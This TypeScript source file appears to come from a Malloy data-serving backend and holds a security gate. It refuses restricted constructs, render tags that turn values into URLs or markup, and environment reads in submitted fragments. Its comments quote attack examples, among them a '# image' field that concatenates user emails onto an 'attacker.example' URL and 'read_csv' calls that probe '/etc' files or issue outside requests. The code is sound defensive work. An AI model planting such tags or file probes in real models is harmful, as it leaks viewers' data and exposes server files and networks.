// Copyright (c) Credible Data Inc.
// SPDX-License-Identifier: MIT

import type { LogMessage, Model, Runtime } from "@malloydata/malloy";
import { Malloy, MalloyError, MalloyTranslator } from "@malloydata/malloy";
import { ParseUtil, type Tag } from "@malloydata/malloy-tag";
import {
   CompileRefusedError,
   RenderTagRefusedError,
   UnparseableTextError,
} from "../errors";
import {
   hasEnvReference,
   MAX_ANNOTATION_CHARS,
   onMotlyRoute,
   parseMotly,
   tagText,
} from "./motly";
import { translatorMalloyError } from "./translator_error";

/**
 * Construct containment for caller-submitted `/compile` text.
 *
 * Malloy resolves a source's schema AT COMPILE TIME: `duckdb.sql("...")`
 * sends a `DESCRIBE` to the connection before any query runs, and
 * `connection.table(...)` fetches the table's schema the same way. So a
 * compile-only endpoint still reaches the database, the filesystem and the
 * network on the caller's behalf. Against DuckDB's external access that makes
 * unrestricted compile an oracle rather than a check: `read_csv('/etc/...')`
 * distinguishes an existing file from a missing one by its error, names the
 * columns of whatever it does read, and `read_csv('https://...')` issues the
 * request. No rows come back, so the exposure is disclosure and SSRF rather
 * than bulk extraction.
 *
 * The query path already refuses these constructs with Malloy's restricted mode
 * (`loadRestrictedQuery`). This applies the same refusal at `append`, the one
 * compile scope whose text is a fragment judged against a curated model.
 *
 * SCOPE, STATED HONESTLY: `scope` is a request-body field the caller chooses,
 * and the three scopes carry no authorization difference today, so this keeps
 * fragment authoring on the model's published surface rather than containing an
 * adversary who can simply ask for `file`. `file` and `package` are ungated by
 * design -- there the text IS the model, where declaring sources and imports is
 * the point -- and that predates this module. Making the refusal a containment
 * boundary means authorizing the scope, which is a separate change.
 *
 * WHY THE COMPILER AND NOT A PATTERN MATCH: which spellings reach a connection
 * is the compiler's classification, not a list this module could keep current.
 * A byte match over untrusted text both over- and under-fires -- it would flag
 * `duckdb.sql` inside a string literal and miss any form it had not heard of.
 * Malloy decides, and reports its decisions with
 * `code: 'restricted-construct-forbidden'`.
 */

/** Malloy's stable marker for a construct restricted mode refuses. */
const RESTRICTED_CONSTRUCT_CODE = "restricted-construct-forbidden";

/**
 * Malloy's code for text that did not parse (`lang/parse-log.d.ts`). Emitted by
 * the parser's own error listener, so it marks the case where no tree was built
 * and therefore nothing in the text was classified.
 */
const SYNTAX_ERROR_CODE = "syntax-error";

/** Whether `problem` says the text failed to parse rather than failing to mean something. */
function isParseFailure(problem: LogMessage): boolean {
   return problem.code === SYNTAX_ERROR_CODE && problem.severity === "error";
}

/**
 * Whether `problems` holds at least one error and every error is a parse
 * failure. A parse failure is a function of the submitted text alone: the
 * parser stops before it reads a source, a field or a connection, so the list
 * cannot say anything about the model it was compiled against.
 */
export function onlyParseFailures(problems: readonly LogMessage[]): boolean {
   const errors = problems.filter((problem) => problem.severity === "error");
   return errors.length > 0 && errors.every(isParseFailure);
}

/** The restricted-construct rejections among `problems`, if any. */
function restrictedRejections(problems: readonly LogMessage[]): LogMessage[] {
   return problems.filter(
      (problem) => problem.code === RESTRICTED_CONSTRUCT_CODE,
   );
}

/**
 * Render tags that turn a cell value into a URL or markup the viewer's browser
 * acts on: `# image` draws `<img src=value>` and `# link` an `<a href>`, with no
 * scheme or host check, so a field the caller defines as
 * `# image pic is concat('https://attacker.example/p?d=', email)` sends the
 * value the viewer may read to a host of the caller's choosing. A model's own
 * fields keep them (the modeler is trusted); a fragment may not write them.
 *
 * Malloy passes annotations through verbatim and the renderer reads them with
 * the MOTLY tag parser, so this reads them the same way: the fragment is
 * PARSED (no schema, no connection, so the answer cannot depend on whether the
 * data exists), every `#` and `#|` annotation is collected from its lexer tokens,
 * and each is parsed as MOTLY. Quoting, backticks, escapes, blocks and a field
 * named `link` used as a value all fall out of that, which a text match cannot
 * promise. Only the single-hash forms are field tags; `##` notes describe the
 * model and are never drawn.
 *
 * Not covered here: renderer sinks that take a data value with no tag (a chart
 * axis label measured through `innerHTML`, pivot headers). Those are the
 * renderer's to fix, and a host content-security-policy is the backstop.
 */
/** A tag is markup when it is an opening or closing tag closed by `>`, a comment or a doctype; `a<b` is text. */
const HTML_START = /<\/?[A-Za-z][^>]*>|<!--|<![A-Za-z]/;

/** Generous multiples of the largest legitimate fragment (322 annotations, 22 KB), so the parse work stays bounded. */
const MAX_HASHES = 4_096;
const MAX_ANNOTATIONS = 1_000;
const MAX_ANNOTATION_CHARS_TOTAL = 65_536;

/** One `extend { … }` block (or the loose text outside one) and the field names it frees and declares. */
interface Block {
   /** The source a statement names, and the source it extends. */
   owner?: string;
   base?: string;
   /** The block this one extends in the same statement (`extend { … } extend { … }`). */
   chain?: Block;
   excepted: Set<string>;
   declared: Set<string>;
}

interface FragmentScan {
   /** Every single-hash annotation, a `#|` block's body included, as the lexer captured it. */
   annotations: string[];
   /** Every `##` note and `##|` block, which the tag parser reads for a document's own tags. */
   notes: string[];
   blocks: Block[];
}

const DECLARING = new Set([
   "DIMENSION",
   "MEASURE",
   "JOIN_ONE",
   "JOIN_MANY",
   "JOIN_CROSS",
   "RENAME",
]);

/** The name an identifier token spells, with Malloy's own backtick decoding so an escaped spelling cannot hide it. */
function nameOf(text: string): string {
   return text.startsWith("`") ? ParseUtil.parseString(text, "`") : text;
}

/** Scan the fragment's lexer tokens: no schema and no connection, so the answer cannot depend on the data. */
function scanFragment(source: string): FragmentScan {
   const url = "internal://render-tag-scan.malloy";
   const translator = new MalloyTranslator(url, null, {
      urls: { [url]: source },
   });
   const parsed = translator.parseStep.step(translator).parse;
   const scan: FragmentScan = { annotations: [], notes: [], blocks: [] };
   if (!parsed) return scan;
   // Symbolic names, not numeric types or parse-tree class names, so a Malloy upgrade or a minified build cannot silently blind the scan.
   const vocabulary = (
      parsed.tokenStream as unknown as {
         tokenSource: { vocabulary: { getSymbolicName(type: number): string } };
      }
   ).tokenSource.vocabulary;
   const tokens = parsed.tokenStream.getTokens().map((token) => ({
      name: vocabulary.getSymbolicName(token.type) ?? "",
      text: token.text ?? "",
   }));
   const newBlock = (from?: Partial<Block>): Block => {
      const block: Block = {
         excepted: new Set(),
         declared: new Set(),
         ...from,
      };
      scan.blocks.push(block);
      return block;
   };
   const stack: { depth: number; block: Block }[] = [];
   let loose = newBlock();
   let depth = 0;
   let owner: string | undefined;
   let wantOwner = false;
   let pending: Partial<Block> | undefined;
   let lastClosed: Block | undefined;
   let lastName: string | undefined;
   let mode: "except" | "declare" | "rename" | undefined;
   let text$: string | undefined;
   let blockIsNote = false;
   const closeBlock = () => {
      if (text$ !== undefined) {
         (blockIsNote ? scan.notes : scan.annotations).push(text$);
      }
      text$ = undefined;
   };
   const current = () => stack[stack.length - 1]?.block ?? loose;
   for (let i = 0; i < tokens.length; i++) {
      const { name, text } = tokens[i];
      if (
         name === "BLOCK_ANNOTATION_BEGIN" ||
         name === "DOC_BLOCK_ANNOTATION_BEGIN"
      ) {
         closeBlock();
         text$ = text;
         blockIsNote = name === "DOC_BLOCK_ANNOTATION_BEGIN";
         continue;
      }
      if (name === "BLOCK_ANNOTATION_TEXT") {
         if (text$ !== undefined) text$ += text;
         continue;
      }
      if (name === "BLOCK_ANNOTATION_END") {
         closeBlock();
         continue;
      }
      closeBlock();
      if (name === "DOC_ANNOTATION") {
         scan.notes.push(text);
         continue;
      }
      if (name === "ANNOTATION") {
         // `##` notes describe the model and are never drawn; a block's closer is not content.
         if (/^#(?!#)/.test(text)) scan.annotations.push(text);
         continue;
      }
      if (name === "OCURLY") {
         depth++;
         if (pending) {
            stack.push({ depth, block: newBlock(pending) });
            pending = undefined;
         }
         continue;
      }
      if (name === "CCURLY") {
         if (stack[stack.length - 1]?.depth === depth) {
            lastClosed = stack.pop()?.block;
         }
         depth--;
         continue;
      }
      pending = undefined;
      const isName = name === "IDENTIFIER" || name === "BQ_STRING";
      if (name === "EXTEND") {
         pending = {
            owner,
            base: lastName,
            chain: tokens[i - 1]?.name === "CCURLY" ? lastClosed : undefined,
         };
         continue;
      }
      if (/^[a-z_]+:$/.test(text)) {
         if (depth === 0) {
            owner = undefined;
            loose = newBlock();
         }
         wantOwner = name === "SOURCE";
         mode =
            name === "EXCEPT"
               ? "except"
               : name === "RENAME"
                 ? "rename"
                 : DECLARING.has(name)
                   ? "declare"
                   : undefined;
         continue;
      }
      if (isName) {
         if (wantOwner) {
            owner = nameOf(text);
            wantOwner = false;
         }
         lastName = nameOf(text);
         if (mode === "except") current().excepted.add(nameOf(text));
         else if (mode && tokens[i + 1]?.name === "IS") {
            current().declared.add(nameOf(text));
            // A rename frees the name it moves away from.
            const from = tokens[i + 2];
            if (mode === "rename" && from)
               current().excepted.add(nameOf(from.text));
         }
      }
   }
   closeBlock();
   return scan;
}

/** The excepted names a block inherits: its own, its chain's, and those of the block its source extends. */
function freedNames(
   block: Block,
   blocks: readonly Block[],
   seen = new Set<Block>(),
): Set<string> {
   const freed = new Set<string>();
   if (seen.has(block)) return freed;
   seen.add(block);
   for (const name of block.excepted) freed.add(name);
   const parents = [
      ...(block.chain ? [block.chain] : []),
      ...(block.base
         ? blocks.filter((other) => other.owner === block.base)
         : []),
   ];
   for (const parent of parents) {
      for (const name of freedNames(parent, blocks, seen)) freed.add(name);
   }
   return freed;
}

/** The first property in `tag` that is a URL-producing render tag, or markup in a `label`. */
function offendingTag(tag: Tag): string | undefined {
   for (const [name, child] of tag.entries()) {
      if (child.deleted) continue;
      if (name === "image" || name === "link")
         return `the render tag \`# ${name}\``;
      if (name === "label") {
         const label = tagText(tag, "label");
         if (label !== undefined && HTML_START.test(label)) {
            return "HTML in a `# label`";
         }
      }
      const elements = Array.isArray(child.eq) ? child.eq : [];
      for (const nested of [child, ...elements]) {
         const found = offendingTag(nested);
         if (found) return found;
      }
   }
   return undefined;
}

/**
 * The refusal for a document's text that writes a render tag turning a value into a URL or markup, reads
 * the server's environment from an annotation, or re-points a model field by excepting and redeclaring a column.
 * Applied to document text only (see `assertNoRestrictedConstructs`).
 */
export function renderTagRefusal(source: string): string | undefined {
   // Counted before parsing, so an oversized body costs a scan and not a parse.
   if (source.split("#").length - 1 > MAX_HASHES) return TOO_MANY;
   const scan = scanFragment(source);
   const total = scan.annotations.reduce((sum, text) => sum + text.length, 0);
   if (
      scan.annotations.length > MAX_ANNOTATIONS ||
      total > MAX_ANNOTATION_CHARS_TOTAL
   ) {
      return TOO_MANY;
   }
   // A `##` note is a document's own tag; the parser drops one that reads `@env.`, which would hide it rather than refuse it.
   for (const note of scan.notes) {
      if (onMotlyRoute(note) && hasEnvReference(note)) return ENV_REFUSAL;
   }
   for (const text of scan.annotations) {
      // `#(docs)`, `#"` and the other routes are prose or another namespace, not render tags.
      if (!onMotlyRoute(text)) continue;
      // The parser hydrates `@env.` from the server's environment; reading it, or neutralizing it, would hide the tag it sits beside.
      if (hasEnvReference(text)) return ENV_REFUSAL;
      // The same rescue the renderer's own readers use, so a bare `f'…'` filter literal is not stricter here than there.
      const parsed = parseMotly([text]);
      // A tag the parser rejects is one the renderer may still read differently, so it fails closed.
      if (parsed.errors.length > 0 || !parsed.tag) {
         return `an annotation does not parse as a tag, or exceeds ${MAX_ANNOTATION_CHARS} characters`;
      }
      const found = offendingTag(parsed.tag);
      if (found) {
         return (
            `the submitted document writes ${found}, ` +
            `which the viewer's browser would load or draw as markup. Fix: define the field in the ` +
            `model file itself, where a modeler owns what it links to, and check that edit at scope "file".`
         );
      }
   }
   for (const block of scan.blocks) {
      if (block.declared.size === 0) continue;
      const freed = freedNames(block, scan.blocks);
      const shadowed = [...block.declared].find((name) => freed.has(name));
      if (shadowed !== undefined) {
         return (
            `the submitted document frees \`${shadowed}\` (except: or rename:) and then declares it, which would re-point every ` +
            `model field derived from it, tags included. Fix: give the new field another name.`
         );
      }
   }
   return undefined;
}

const ENV_REFUSAL =
   "an annotation reads the server's environment (`@env.`), which a document may not do";

const TOO_MANY = `the submitted document carries more annotations than one may (over ${MAX_ANNOTATIONS}, ${MAX_ANNOTATION_CHARS_TOTAL} characters in all, or ${MAX_HASHES} \`#\` characters)`;

/** Throws RenderTagRefusedError when document text writes a render tag that turns a value into a URL or markup. Syntactic, so it answers a hidden source and an absent one alike. */
export function assertNoRenderTags(source: string): void {
   const refusal = renderTagRefusal(source);
   if (refusal) {
      throw new RenderTagRefusedError(
         `This Malloy cannot be compiled at scope "append", which validates a ` +
            `fragment against the model's published surface: ${refusal}`,
      );
   }
}

/**
 * Compile `source` against `model` in restricted mode and throw if it uses a
 * construct that reaches outside the model's curated surface.
 *
 * Only restricted-construct rejections are acted on here, with ONE exception:
 * a parse failure (below). Every other diagnostic -- an undefined field, a
 * redefinition -- is left untouched for the real compile to report, so this
 * gate never becomes a second source of ordinary compile errors with its own
 * coordinates and wording.
 *
 * The exception exists because this gate parses a DIFFERENT unit from the
 * compile it guards: it judges the fragment alone, while the real compile runs
 * `${modelContent}\n${source}`. It cannot simply be handed the concatenation --
 * `extendModel` judges text as an extension of a model that already holds those
 * declarations, so the model's own text comes back as `Cannot redefine` for
 * every source in it and nothing in the appended fragment is classified at all.
 * So the units stay different, and the gate instead refuses whenever it could
 * not parse what it was given.
 *
 * What is ruled out above is the CONCATENATION, not the fragment. Running the
 * real append compile as an unrestricted `extendModel` of the loaded base model
 * -- the fragment alone, once, in place of both compiles -- is a live option: it
 * would make the gate and the compile one unit and drop the second compile from
 * inside the per-package mutex, at the cost of offsetting every diagnostic
 * position by the model's line count. It is a larger change than this gate, and
 * the parse-failure refusal is sufficient without it.
 *
 * The gate is deliberately a separate compile from the one whose diagnostics
 * the caller receives. Restricted mode changes what compiles, so reusing its
 * result as the answer would change the positions and the problem set an
 * author sees for legitimate text. This runs first, refuses or passes, and the
 * unrestricted compile then proceeds exactly as before.
 */
export async function assertNoRestrictedConstructs(
   runtime: Runtime,
   // Not `Model | undefined`. Several of the constructs this refuses --
   // `name!type(...)` and the `sql_*` family -- are classified inside
   // `computeExpression(fs)` and need a resolved FieldSpace, so with no base
   // model they are never classified and the gate returns clean on text it
   // should refuse. Requiring one makes that a type error rather than a
   // convention a later caller can break silently.
   model: Model,
   source: string,
   /**
    * `renderTags`: the text is a document, which other viewers run, so the
    * render-tag checks apply. A plain fragment is the caller's own compile and
    * keeps the tags it could always write.
    */
   { renderTags }: { renderTags: boolean },
): Promise<void> {
   if (renderTags) assertNoRenderTags(source);
   let problems: readonly LogMessage[];
   try {
      const compiled = await Malloy.compile({
         source,
         model,
         restrictedMode: true,
         // Labels the synthetic `internal://` URL this compile is given; the
         // text is an extension of an already-loaded model, not a model of its
         // own.
         method: "extendModel",
         urlReader: runtime.urlReader,
         connections: runtime.connections,
         // Collect problems rather than throwing on the first one, so a caller
         // using two forbidden constructs is told about both at once.
         noThrowOnError: true,
      });
      problems = compiled.problems ?? [];
   } catch (error) {
      // A MalloyError still carries the diagnostics, so a restricted rejection
      // that arrives as a throw is the refusal this gate exists for. Anything
      // else is an infrastructure failure (an unreachable connection, a bad
      // URL) and must stay distinguishable from "the caller wrote something
      // forbidden" -- silently treating it as a pass would open the gate on
      // exactly the errors that carry no evidence either way.
      // The translator's plain Error is the caller's text, not the
      // infrastructure: it is read as the one problem it stands for.
      const compileError =
         error instanceof MalloyError ? error : translatorMalloyError(error);
      if (!compileError) throw error;
      problems = compileError.problems;
   }

   const rejected = restrictedRejections(problems);
   if (rejected.length === 0) {
      // A PARSE FAILURE IS NOT A PASS. Classification happens while walking a
      // parsed tree, so text that never parsed was never judged -- the gate
      // saw no forbidden construct because it saw no constructs at all. Before
      // this, that silence was read as approval, which is the wrong direction
      // for a gate: the one text guaranteed to produce it is text that does
      // not stand alone, and the real compile may still run it as part of a
      // larger whole.
      //
      // Only a parse-level failure is treated this way. An ordinary semantic
      // error -- an undefined field, a redefinition -- means the tree WAS
      // walked and the constructs in it WERE classified, so the absence of a
      // rejection there is real evidence and the diagnostic belongs to the
      // caller-facing compile rather than to this gate.
      const parseFailures = problems.filter(isParseFailure);
      if (parseFailures.length > 0) {
         const detail = parseFailures
            .map((problem) => problem.message)
            .join("; ");
         throw new UnparseableTextError(
            `This Malloy cannot be compiled at scope "append": the submitted ` +
               `text could not be parsed on its own (${detail}), so it cannot be checked ` +
               `against the model's published surface. Fix: send text that ` +
               `stands alone as top-level Malloy -- a complete ` +
               `\`source:\`/\`query:\`/\`run:\` statement rather than a ` +
               `continuation of one already in the model.`,
            detail,
         );
      }
      return;
   }

   // A caller-input refusal, so 400 rather than a compile-diagnostics response:
   // the text is not being reported as invalid Malloy, it is being refused.
   throw new CompileRefusedError(
      `This Malloy cannot be compiled at scope "append", which validates a ` +
         `fragment against the model's published surface: ` +
         `${rejected.map((problem) => problem.message).join(" ")} ` +
         `Fix: reference the model's own sources. Defining sources and ` +
         `imports belongs in the model file itself -- see the compile-scope ` +
         `documentation.`,
   );
}
